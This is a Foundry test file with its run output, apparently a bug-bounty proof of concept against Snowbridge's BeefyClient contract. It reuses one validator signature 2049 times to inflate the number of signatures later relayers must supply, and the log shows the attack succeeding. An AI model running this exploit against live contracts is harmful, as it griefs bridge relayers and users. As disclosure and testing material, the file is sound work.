pragma solidity 0.8.28;

import "forge-std/Test.sol";

import {BeefyClient} from "../src/BeefyClient.sol";
import {SubstrateMerkleProof} from "../src/utils/SubstrateMerkleProof.sol";
import {Bitfield} from "../src/utils/Bitfield.sol";
import {ScaleCodec} from "../src/utils/ScaleCodec.sol";

contract BeefyClientSignatureUsageInflationTest is Test {
    using stdStorage for StdStorage;
    address attacker = address(0xA11CE);
    address honestRelayer1 = address(0xBEEF);
    address honestRelayer2 = address(0xCAFE);
    // validator at index 0 (so i can control its private key)
    uint256 validator0PK = 0x1111;
    address validator0;
    BeefyClient beefy;
    uint256 constant VSET_LEN = 256;
    address[VSET_LEN] validators;
    bytes32[VSET_LEN] validatorLeaves;
    bytes32 vsetRoot;
    bytes32[] proofIndex0;

    BeefyClient.Commitment commitment;
    bytes32 commitmentHash;
    bytes2 constant MMR_ROOT_ID = bytes2("mh");
    uint64 constant CUR_SET_ID = 1;
    uint64 constant NEXT_SET_ID = 2;

    function setUp() external {
        validator0 = vm.addr(validator0PK);
        validators[0] = validator0;
        for (uint256 i = 1; i < VSET_LEN; i++) {
            validators[i] = address(uint160(uint256(keccak256(abi.encodePacked("v", i)))));
        }
        for (uint256 i = 0; i < VSET_LEN; i++) {
            validatorLeaves[i] = keccak256(abi.encodePacked(validators[i]));
        }
        (vsetRoot, proofIndex0) = _buildRootAndProofForIndex0(validatorLeaves);
        BeefyClient.ValidatorSet memory cur =
            BeefyClient.ValidatorSet({id: uint128(CUR_SET_ID), length: uint128(VSET_LEN), root: vsetRoot});
        BeefyClient.ValidatorSet memory nxt =
            BeefyClient.ValidatorSet({id: uint128(NEXT_SET_ID), length: uint128(VSET_LEN), root: vsetRoot});

        beefy = new BeefyClient({
            _randaoCommitDelay: 0,
            _randaoCommitExpiration: 64,
            _minNumRequiredSignatures: 1, // baseline N = 10 at V=256, C=0
            _initialBeefyBlock: 0,
            _initialValidatorSet: cur,
            _nextValidatorSet: nxt
        });

        // a real commitment and hash it exactly like the contract
       BeefyClient.PayloadItem[] memory payload = new BeefyClient.PayloadItem[](1);
       payload[0] = BeefyClient.PayloadItem({ payloadID: MMR_ROOT_ID, data: bytes.concat(bytes32(uint256(0xDEADBEEF))) });

    commitment = BeefyClient.Commitment({
    blockNumber: 1,
    validatorSetID: CUR_SET_ID,
    payload: payload
    });

    bytes memory enc = _encodeCommitment(commitment);
    commitmentHash = keccak256(enc);
    }

    function test_Exploit_SignatureUsageInflation() external {
        // === build a bitfield claiming >= quorum signers ===
        uint256 quorum = _computeQuorum(VSET_LEN); // 171
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }
        // === real validator proof for index 0 with a real signature ===
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator0PK, commitmentHash);
        BeefyClient.ValidatorProof memory vproof = BeefyClient.ValidatorProof({
            v: v, r: r, s: s, index: 0, account: validator0, proof: proofIndex0
        });

        // -------------------------
        // 1) baseline (honest relayer #1 before the attack)
        // -------------------------
        vm.startPrank(honestRelayer1);
        beefy.submitInitial(commitment, bitfield, vproof);
        bytes32 ticketID1 = _ticketID(honestRelayer1, commitmentHash);
        (/*blockNumber1*/,
         /*vsetLen1*/,
         uint32 nRequiredBefore,
         /*prevRandao1*/,
         /*bitfieldHash1*/) = beefy.tickets(ticketID1);
        vm.stopPrank();
        // -------------------------
        // 2) attack: reuse SAME signature many times to inflate global C
        // -------------------------
        vm.startPrank(attacker);
        uint256 spam = 2049; // ceilLog2(2049) = 12  => ΔN = 2*12 = +24
        for (uint256 i = 0; i < spam; i++) {
            beefy.submitInitial(commitment, bitfield, vproof);
        }
        vm.stopPrank();
        // -------------------------
        // 3) impact: new relayer now gets 24+ extra sigs required
        // -------------------------
        vm.startPrank(honestRelayer2);
        beefy.submitInitial(commitment, bitfield, vproof);
        bytes32 ticketID2 = _ticketID(honestRelayer2, commitmentHash);
        (/*blockNumber2*/, /*vsetLen2*/, uint32 nRequiredAfter, /*prevRandao2*/, /*bfhash2*/) = beefy.tickets(ticketID2);
        vm.stopPrank();
        // assert protocol-wide grief: ΔN >= 24 and never exceeds quorum
        assertGt(nRequiredAfter, nRequiredBefore, "N did not increase");
        assertLe(nRequiredAfter, uint32(quorum), "N must be capped at quorum");
        assertTrue(nRequiredAfter >= nRequiredBefore + 24, unicode"Need ΔN >= 24 for high-impact demo");
        // logs
        emit log_named_uint("Baseline N (before attack)", nRequiredBefore);
        emit log_named_uint("N after attack", nRequiredAfter);
        emit log_named_uint(unicode"ΔN", nRequiredAfter - nRequiredBefore);
        emit log_named_uint("Quorum cap", quorum);
    }

    // -------------------------
    // Helpers (encodings & Merkle)
    // -------------------------

    function _ticketID(address relayer, bytes32 cHash) internal pure returns (bytes32 value) {
        assembly {
            mstore(0x00, relayer)
            mstore(0x20, cHash)
            value := keccak256(0x00, 0x40)
        }
    }

    function _encodeCommitment(BeefyClient.Commitment memory c) internal pure returns (bytes memory) {
        return bytes.concat(
            _encodeCommitmentPayload(c.payload),
            ScaleCodec.encodeU32(c.blockNumber),
            ScaleCodec.encodeU64(c.validatorSetID)
        );
    }

    function _encodeCommitmentPayload(BeefyClient.PayloadItem[] memory items)
        internal
        pure
        returns (bytes memory)
    {
        bytes memory payload = ScaleCodec.checkedEncodeCompactU32(uint32(items.length));
        for (uint256 i = 0; i < items.length; i++) {
            payload = bytes.concat(
                payload,
                items[i].payloadID,
                ScaleCodec.checkedEncodeCompactU32(uint32(items[i].data.length)),
                items[i].data
            );
        }
        return payload;
    }
    function _buildRootAndProofForIndex0(bytes32[VSET_LEN] memory leaves)
        internal
        pure
        returns (bytes32 root, bytes32[] memory proofForIdx0)
    {
        require((VSET_LEN & (VSET_LEN - 1)) == 0, "VSET_LEN must be power of two");
        bytes32[] memory lvl = new bytes32[](VSET_LEN);
        for (uint256 i = 0; i < VSET_LEN; i++) {
            lvl[i] = leaves[i];
        }

        uint256 depth = _ceilLog2(VSET_LEN);
        proofForIdx0 = new bytes32[](depth);

        uint256 width = VSET_LEN;
        uint256 p = 0;
        while (width > 1) {
            // sibling of index 0 is index 1 at each level in a perfect tree
            bytes32 right = lvl[1];
            proofForIdx0[p++] = right;

            // build next level
            uint256 nextWidth = width >> 1;
            bytes32[] memory next = new bytes32[](nextWidth);
            for (uint256 i = 0; i < width; i += 2) {
                next[i >> 1] = _effHash(lvl[i], lvl[i + 1]); // left-right
            }
            lvl = next;
            width = nextWidth;
        }
        root = lvl[0];
    }

    function _effHash(bytes32 a, bytes32 b) internal pure returns (bytes32 value) {
        assembly {
            mstore(0x00, a)
            mstore(0x20, b)
            value := keccak256(0x00, 0x40)
        }
    }

    function _ceilLog2(uint256 x) internal pure returns (uint256 n) {
        require(x > 0, "x>0");
        uint256 y = x - 1;
        while (y > 0) {
            y >>= 1;
            n++;
        }
    }

    function _computeQuorum(uint256 numValidators) internal pure returns (uint256) {
        if (numValidators > 3) {
            return numValidators - (numValidators - 1) / 3;
        }
        return numValidators;
    }
}








root@Gandhi:/home/gajnithehero/Desktop/Targets/snowbridge/contracts# forge test -vvv --match-path test/test.sol --via-ir
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/test.sol:BeefyClientSignatureUsageInflationTest
[PASS] test_Exploit_SignatureUsageInflation() (gas: 45952849)
Logs:
  Baseline N (before attack): 10
  N after attack: 34
  ΔN: 24
  Quorum cap: 171

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 585.18ms (580.45ms CPU time)

Ran 1 test suite in 588.31ms (585.18ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
root@Gandhi:/home/gajnithehero/Desktop/Targets/snowbridge/contracts#
